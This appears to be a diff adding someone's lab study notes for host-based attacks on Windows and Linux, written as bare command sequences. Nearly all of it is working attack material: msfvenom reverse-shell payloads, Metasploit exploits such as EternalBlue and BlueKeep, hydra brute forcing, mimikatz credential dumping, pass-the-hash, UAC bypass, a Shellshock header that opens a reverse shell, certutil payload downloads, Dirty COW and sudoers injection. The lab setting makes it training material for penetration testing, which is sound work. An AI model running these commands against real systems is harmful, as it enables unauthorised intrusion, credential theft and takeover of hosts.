@@ -1,0 +1,682 @@
+System/Host Based Attacks
+
+    Windows: IIS Server DAVTest                                              
+cat Desktop/target
+nmap 10.0.20.30
+nmap -sV --script=http-enum 10.0.20.30   #found  /webdav/
+Davtest  # tool
+davtest -auth bob:password_123321 -url http://10.0.20.30/webdav
+cadaver http://10.0.20.30/webdav # provide username and password
+ls -al /usr/share/webshells/asp/ 
+put /usr/share/webshells/asp/webshell.asp  # devtest dir
+ http://10.0.16.177/webdav/webshell.asp  #click the webshell.asp file
+dir C:\
+type C:\flag.txt
+
+—-----------------------------------------------------------------------------------------------------------------------------------------
+Windows: IIS Server: WebDav Metasploit
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=10.10.16.2 LPORT=1234 -f asp >shell.asp
+cadaver http://10.0.22.253/webdav
+dav:/webdav/> put /root/shell.asp
+service postgresql start && msfconsole
+use multi/handler
+ set payload windows/meterpreter/reverse_tcp
+show options
+ set LHOST 10.10.16.2
+set LPORT 1234
+Run
+dir C:\
+—-----------------------------------------------------------------------------------------------------------------------------------------
+Method 2
+nmap -sV -p80 --script=http-enum 10.0.16.149
+service postgresql start && msfconsole
+search iis upload
+ use exploit/windows/iis/iis_webdav_upload_asp 
+show options
+set HttpUsername bob
+set HttpPassword password_123321
+set RHOST 10.0.16.149
+set PATH /webdav/meterperter.asp
+Run
+Shell
+dir C:\
+—-----------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+     3.   Windows: SMB Server PSexec
+
+ nmap  -sVC 10.20.3.23
+service postgresql start && msfconsole
+search smb_login
+use auxiliary/scanner/smb/smb_login
+show options
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set RHOSTS 10.20.3.23
+set VERBOSE false
+Run
+We found username and password
+
+open new tab
+psexec.py
+psexec.py Administrator@10.2.24.221 cmd.exe
+and provide the password
+whoami
+
+
+search psex // msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS 10.12.13.2
+set SMBUser Administrator
+set SMBPass qwertyuiop
+Exploit
+
+shell 
+cd /
+ dir type flag.txt
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+ 4.  Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)
+
+nmap -sV -p 445 -O 10.10.10.12
+sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.12
+AutoBlue-MS17-010 //github tool
+cd shellcode
+chmod +x shell_prep.sh
+./shell_prep.sh
+ip address kalilinux:ip
+port number 
+regurer shell 
+stageless payload
+ls
+nc -nvlp 1234
+cd ..
+chmod +x eternalblue_exploit7.py
+python eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin
+Whoami
+
+Method 2
+
+msfconsole
+search eternalblue
+use exploit/windows/smb/smb_ms17_010
+show options
+set RHOSTS 10.10.10.12
+run
+Sysinfo
+
+ 5.  Windows: Insecure RDP Service
+nmap -sV 10.23.2.11
+service postgresql start && msfconsole
+search rdp_scanner
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS 10.23.21.1
+set RPORT 3333
+run
+give the details RDP
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.28.194 -s 3333
+
+//freerdp
+xfreerdp /u:administrator /p:qwertyuiop /v:10.0.28.194:3333
+
+ 6.  Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
+sudo nmap -p 3389 10.10.23.2
+msfconsole
+search BlueKeep
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+show options
+set RHOST 10.10.23.2
+run
+search BlueKeep
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+show options
+set RHOST 10.10.23.2
+exploit
+show targets
+set target 2  # select windows version
+exploit
+sysinfo
+getuid
+7. WinRM: Exploitation with Metasploit
+
+nmap -sV -p5985 10.34.21.3
+Crackmapexec
+
+crackmapexec winrm 10.0.19.184 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
+
+crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"
+crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "sysinfo"
+for command shell>>>>
+evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.12.13.21
+net user
+
+service postgresql start && msfconsole
+search winrm_script
+use exploit/windows/winrm/winrm_script_exec
+show options
+set RHOSTS 10.10.21.23
+set FORCE_VBS true
+set USERNAME administrator
+set PASSWORD tinkerbell
+run
+sysinfo
+Getuid
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+ 8.  Windows Kernel Exploits
+https://github.com/AonCyberLabs/Windows-Exploit-Suggerster
+https://github.com/SecWiki/Windows-kernal-exploits/tree/master/MS16-135
+
+msfconsole
+getprivs
+getsystem
+search suggester
+use post/multi/recon/local_exploit_suggester
+run
+use exploit/windows/local/ms16_014_wmi_recv_notif
+show options
+set SESSIONS 3
+set LPORT 4422
+exploit
+ctrl +z
+sessions
+sessions 3
+getuid
+shell
+systeminfo copy the information
+vim wind7.txt
+cd windows-Enum/Windows-Exploit-Suggerster
+./windows-exploit-suggester.py --update
+./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt
+google search SecWiki/windows
+sessions opened then 
+cd C:\\
+ls
+cd Temp\\
+upload ~/Download/41015.exe
+shell
+dir
+.\41015.exe
+.\41015.exe 7
+Whoami
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+9.  Bypassing UAC With UACMe
+
+https://github.com/hfiref0x/UACME
+cmd 
+net users
+net localgroup administrators
+
+-----
+nmap  10.2.22.220
+service postgresql start && msfconsole
+setg RHOSTS 10.2.22.220
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec
+show options
+exploit
+sysinfo
+pgrep explorer // it will give the id 2448
+migrate 2448
+getuid
+getprivs
+shell
+net users
+net localgroup administrator
+net user admin password123 //access denied
+go to the hfiref0x/UACME
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=kaliIP LPORT=1234 -f exe> backdoor.exe
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST kaliIP
+set LPORT 1234
+run
+
+meterpreter sessions
+pwd
+cd C:\\
+mkdir Temp
+cd Temp
+upload backdoor.exe
+upload /root/Desktop/tools/UACME/Akagi64.exe
+shell
+dir
+.\Akagi64.exe 23 C:\Temp\backdoor.exe               NOTE 😣
+sysinfo
+getuid
+getprivs
+ps
+migrate 688
+Getuid
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+10.  Access Token Impersonation
+
+searchsploit hfs
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.0.28.7
+exploit 
+getuid
+cat C:\\Users\\Administrator\\Desktop\\flag.txt
+load incognito
+list_tokens -u
+impersonate_token ATTACKDEFENSE\\Administrator 
+getuid
+cat C:\\Users\\Administrator\\Desktop\\flag.txt
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+ 11.  Alternate Data Streams
+
+cmd
+cd Desktop
+notepad test.txt
+enter some data
+delete test.txt
+notepad test.txt:secret.txt
+this is hidden
+dir
+notepad test.txt
+this is visible
+notepad test.txt:secret.txt
+del test.txt
+cd \
+cd Temp
+type payload.ext >windowslog.txt:winpeas.txt
+notepad windowslog.txt
+this is visible
+dir
+start windowslog.txt:winpeas.ext //error
+so create a link
+cd \
+mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
+Wupdate.exe
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+12.  Windows Password Hashes
+
+Searching for passwords in windows configuration files
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Autounattend.xml
+net user
+whoami /priv
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.21.2 LPORT=1224 -f exe >payload.exe
+python -m SimpleHTTPServer 80
+windows  cmd
+cd Desktop
+certutil -urlcache -f http://kaliIP/payload.exe payload.exe
+go to kali
+service postgresql start && msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 1233
+set LHOST kaliip
+run
+sysinfo
+search -f Unattend.xml
+cd C:\\
+cd Windows
+cd Panther
+dir
+download unattend.xml
+cat unattend.xml
+psexec.py Administrator@10.2.27.165
+13.  Dumping Hashes With Minikatz
+
+nmap 10.2.18.199
+service postgresql start && msfconsole
+search Badblue
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.2.18.199
+run
+sysinfo
+getuid
+pgrep lsass
+migrate 2342
+getuid
+load kiwi
+?
+creds_all
+lsa_dump_sam
+?
+password_change
+pwd
+cd C:\\
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+shell
+dir
+.\mimikatz.exe
+privilege::debug
+lsadump::sam
+lsadump::secrets
+Sekurlsa::logonpasswords
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+ 14.   Pass-The_Hash Attacks
+
+service postgresql start && msfconsole
+search badblue
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.21.23
+exploit
+pgrep lsass
+migrate 789
+getuid
+load kiwi
+lsa_dump_sam
+copy Administrator,student NTLM hash
+hashdump
+ctrl+x
+search psexec
+use exploit/windows/smb/psexec
+set LPORT 4422
+set RHOST 10.23.54.3
+set SMBUser Administrator
+set SMBPass (past NTLM hash)
+run
+sessions
+set target Command
+exploit
+set target Native\ upload
+exploit
+sysinfo
+sessions -K
+exploit
+
+
+crackmapexec smb 10.2.45.3
+crackmapexec smb -u Administrator -H "provide NTLM hash"
+crackmapexec smb -u Administrator -H "provide NTLM hash" -x "ipconfig"
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------Linux
+
+ 15.  Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
+
+Exploiting Bash CVE-2014-6271 vulnerability (Shellshock)
+ifconfig eth1
+nmap  -sV 10.12.32.2
+10.12.32.2/gettime.cgi
+nmap -sV --script=http-shellshock  script-args "http-shellshock.uri=/gettime.cgi" 10.12.32.2
+burpsuite
+repeter
+user Agetnt:(){:;}; echo; echo; /bin/bash -c 'cat /etc/passwd'
+user Agetnt:(){:;}; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/kaliIP/1234 0>&1'
+nc -nvlp 1234
+cat /etc/*issue
+uname -a
+
+service postgresql start && msfconsole
+search shellshock
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+show options
+set RHOSTS 10.32.5.4
+set TARGETURI /gettime.cgi
+run
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+  16. Exploiting FTP
+
+ifconfig
+nmap -sV 10.21.3.2
+ftp 10.21.3.2
+anonymous
+exit
+ls -al /usr/share/nmap/scripts/ |grep ftp-*
+
+hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P
+/usr/share/metasploit-framework/data/wordlist/unix_passwords.txt  10.21.3.2 -t 4 ftp
+
+ftp 10.21.3.2
+sysadmin
+password
+dir
+get secret.txt
+exit
+cat secret.txt
+searchsploit ProFTPD
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+17.  Exploiting SSH
+
+ifconfig
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P
+/usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 10.10.32.2 ssh
+
+ssh sysadmin@10.1.23.2
+whoami
+groups sysadmin
+cat /etc/*issue
+uname -r
+cat /etc/passwd
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+18.  Exploiting SAMBA
+
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb
+
+smbmap
+smbmap -H 192.56.47.3 -u admin -p password1
+man smbclient
+smbclient
+smbclient -L 192.168.34.3 -U admin
+smbclient //192.168.34.3/shawn -U admin   #shown is share
+provide the password
+?
+dir
+cd dev\
+dir
+cd ..
+exit
+smbclient //192.168.34.3/nancy -U admin
+get flag
+exit
+cat flag
+tar xzf flag.tar.gz
+enum4linux -a 192.168.32.3
+enum4linux -a -u admin -p passwordd1 192.168.32.4 
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+19.    Linux Kernel exploits
+
+https://github.com/mzet-/linux-exploit-suggester
+
+msfconsole
+sysinfo
+getuid
+shell
+/bin/bash -i
+groups www-data
+cat /etc/passwd
+ctrl +c
+
+cd /tmp
+ls
+upload ~/Desktop/Linux-Enum/les.sh
+shell
+/bin/bash -i
+ls
+chmod +x les.sh
+./les.sh
+# Refer to Dirty COW
+sudo apt-get install gcc
+download the code and navigate to the directory
+mv 40839.c dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+terminate the chennel (ctrl+c)
+meterpreter > upload ~/Download/dirty
+shell
+/bin/bash -i
+chmod +x dirty
+./dirty password123 #unable to compail in the target
+meterpreter > upload ~/Desktop/dirty.c
+shell
+/bin/bash -i
+gcc -pthread dirty.c -o dirty -lcrypt
+chmod +x dirty
+./dirty password123
+cat /etc/passwd
+su firefart
+ssh firefart@10.23.2.12 #some error copy and past provide in the terminal
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+  20.  Exploiting Misconfigured Cron Jobs
+
+whoami
+groups student
+cat /etc/passwd
+crontab -l
+ls -al
+pwd
+cat message
+cd /
+grep -rnw /usr -e "/home/student/message"
+ls -al /tmp
+cat /tmp/message
+ls -al/usr/local/share/copy.sh
+cat /usr/local/share/copy.sh
+printf '#!/bin/bash\necno "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+cat /usr/local/share/copy.sh
+sudo -l
+sudo su
+whoami
+cd /root
+cat flag
+crontab -l
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+
+21. Exploiting SUID Binaries
+
+SUID:- set owner user id
+groups student
+pwd
+ls -al
+./greeting
+./welcome
+file welcome
+strings welcome
+rm greetings
+cp /bin/bash greetings
+./welcome
+id
+cat /etc/shadow
+
+—--------------------------------------------------------------------------------------------------------------------------------------------------
+ 22. Dumping Linux Password Hashes
+
+value    hashingalgorithm
+$1          	MD5
+$2              Blowfish
+$5              SHA-256
+$6              SHA-512
+
+
+searchsploit ProFTPd
+service postgresql start && msfconsole
+setg RHOSTS 192.20.32.3
+search proftpd
+use exploit/linux/ftp/proftpd_133c_backdoor
+exploit
+/bin/bash -i
+id
+ctrol+z
+sessions
+sessions -u 1
+cat /etc/shadow
+ctrol +z
+METHOD 2
+--------
+search hashdump
+use post/linux/gather/hashdump
+show options
+set sessions 2
+run
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
